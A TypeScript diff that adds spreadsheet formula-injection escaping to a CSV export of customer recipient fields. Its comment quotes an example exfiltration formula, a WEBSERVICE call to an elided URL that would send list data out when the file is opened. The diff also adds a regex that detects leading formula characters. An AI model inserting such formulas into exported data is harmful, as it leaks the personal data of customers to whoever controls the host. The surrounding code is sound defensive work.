@@ -64,8 +64,22 @@ const FIELD_KEYS = [
   'phone',
 ] as const
 
+/**
+ * Excel, LibreOffice and Sheets execute any cell whose first character is one
+ * of these. Recipient fields are customer-supplied (CSV import or manual entry)
+ * and vendors open recipients.csv in a spreadsheet, so an unescaped
+ * `=WEBSERVICE("http://…"&B2)` in a first_name would run on their machine and
+ * exfiltrate the rest of the list. Prefixing an apostrophe makes the cell text
+ * without losing a character of the original value (CWE-1236).
+ */
+const FORMULA_PREFIX = /^[=+\-@\t\r]/
+
+export function neutralizeSpreadsheetFormula(value: string): string {
+  return FORMULA_PREFIX.test(value) ? `'${value}` : value
+}
+
 function csvCell(value: unknown): string {
-  const s = value == null ? '' : String(value)
+  const s = neutralizeSpreadsheetFormula(value == null ? '' : String(value))
   return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
 }
 
